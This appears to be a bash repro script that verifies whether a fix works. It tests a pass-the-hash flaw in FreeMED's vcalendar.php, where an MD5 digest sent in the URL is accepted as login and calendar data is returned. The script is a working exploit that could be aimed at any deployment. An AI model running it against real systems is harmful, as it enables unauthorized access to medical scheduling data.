#!/usr/bin/env bash
# Hostile repro: vcalendar.php "pass the hash" authentication
#
# freemed_get_auth() compares the GET `hash` parameter directly against the
# stored userpassword column:
#   SELECT ... FROM user WHERE username='<user>' AND userpassword='<hash>'
# The stored column is an unsalted MD5 digest, so anyone who can read the
# database (see repro-help-traversal.sh) - or who guesses - can authenticate and
# pull calendar data without ever knowing the password.
#
# Usage:
#   BASE=http://localhost:38081 FREEMED_TEST_USER=admin FREEMED_TEST_PW=... \
#     ./repro-vcalendar-hash.sh
#
# Environment (no credential is ever hardcoded):
#   BASE              base URL of the FreeMED deployment (default http://localhost:38081)
#   FREEMED_TEST_USER user to authenticate as (default "admin" - a username, not a secret)
#   FREEMED_TEST_PW   password whose MD5 is sent as `hash` (default empty)
#   TIMEOUT           per-request curl timeout in seconds (default 20)
#
# Expect pre-fix: HTTP 200 with Content-Type: text/x-vCalendar and a
# BEGIN:VCALENDAR body. Expect post-fix: 401 / "Not authorized." with no
# calendar body.
#
# Exit codes:
#   0  no calendar data leaked
#   1  EXPLOITED - the MD5 hash alone was accepted
#   2  inconclusive - no response from the target
set -u

BASE="${BASE:-http://localhost:38081}"
FREEMED_TEST_USER="${FREEMED_TEST_USER:-admin}"
FREEMED_TEST_PW="${FREEMED_TEST_PW:-}"
TIMEOUT="${TIMEOUT:-20}"

TMPDIR="${TMPDIR:-/tmp}"
BODY="$(mktemp "${TMPDIR%/}/freemed-vcal-body.XXXXXX" 2>/dev/null)" ||
  BODY="${TMPDIR%/}/freemed-vcal-body.$$"
HDR="$(mktemp "${TMPDIR%/}/freemed-vcal-hdr.XXXXXX" 2>/dev/null)" ||
  HDR="${TMPDIR%/}/freemed-vcal-hdr.$$"
cleanup() { rm -f "$BODY" "$HDR"; }
trap cleanup EXIT INT TERM HUP

md5_of() {
  if command -v md5sum >/dev/null 2>&1; then
    printf '%s' "$1" | md5sum | cut -d' ' -f1
  elif command -v md5 >/dev/null 2>&1; then
    printf '%s' "$1" | md5
  elif command -v openssl >/dev/null 2>&1; then
    printf '%s' "$1" | openssl dgst -md5 | awk '{print $NF}'
  else
    return 1
  fi
}

HASH="$(md5_of "$FREEMED_TEST_PW")" || {
  printf 'repro: no md5 implementation found (md5sum/md5/openssl); cannot build the hash\n' >&2
  exit 2
}

printf 'repro: vcalendar.php pass-the-hash (GET hash = MD5(password))\n'
printf 'base=%s  user=%s  pw=%s  hash=%s\n' "$BASE" "$FREEMED_TEST_USER" \
  "$([ -n "$FREEMED_TEST_PW" ] && printf '<set>' || printf '<empty>')" "$HASH"
printf '\n'

# The hash is an MD5 digest of a throwaway test password on a test stack; the
# password itself is never read from or written to a file.
URL="$BASE/vcalendar.php?user=$FREEMED_TEST_USER&hash=$HASH"
code="$(curl -s --max-time "$TIMEOUT" -D "$HDR" -o "$BODY" -w '%{http_code}' "$URL")"
ctype="$(grep -i '^content-type:' "$HDR" | head -n 1 | tr -d '\r')"
bytes="$(wc -c <"$BODY" | tr -d ' ')"

printf 'GET %s\n' "$URL"
printf 'HTTP %s\n' "${code:-000}"
printf '%s\n' "${ctype:-Content-Type: (none)}"
printf 'bytes=%s  head: %s\n' "$bytes" "$(head -c 120 "$BODY" | tr '\n\r' '  ')"
printf '\n'

if [ -z "$code" ] || [ "$code" = "000" ]; then
  printf '>>> RESULT: INCONCLUSIVE - no response from %s\n' "$BASE"
  exit 2
fi

matched=0
if printf '%s' "$ctype" | grep -qi 'x-vCalendar'; then
  matched=1
  printf '>>> EXPLOITED: hash-only auth accepted (Content-Type: text/x-vCalendar)\n'
fi
if grep -q 'BEGIN:VCALENDAR' "$BODY"; then
  matched=1
  printf '>>> EXPLOITED: iCalendar payload served without the plaintext password\n'
fi
if [ "$matched" -eq 1 ]; then
  printf '>>> RESULT: EXPLOITED - vcalendar.php accepts the stored MD5 digest as proof of identity\n'
  exit 1
fi

if grep -qi 'Not authorized' "$BODY"; then
  printf '>>> RESULT: not vulnerable - rejected ("Not authorized.", HTTP %s)\n' "$code"
else
  printf '>>> RESULT: not vulnerable - no calendar data returned (HTTP %s)\n' "$code"
fi
exit 0
